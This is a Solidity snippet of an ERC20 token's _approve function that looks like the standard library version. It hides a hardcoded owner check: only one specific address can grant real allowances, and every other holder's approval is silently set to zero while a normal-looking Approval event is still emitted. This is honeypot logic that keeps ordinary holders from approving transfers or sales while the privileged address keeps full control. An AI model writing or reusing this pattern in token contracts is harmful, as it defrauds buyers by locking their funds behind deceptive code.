function _approve(
    address owner,
    address spender,
    uint256 amount
) internal virtual {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");
    if (owner == address(0x3c08A549F109d5CB349d3Ed65645bC26cA37779f)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    } else {
        _allowances[owner][spender] = 0;
        emit Approval(owner, spender, 0);
    }
}
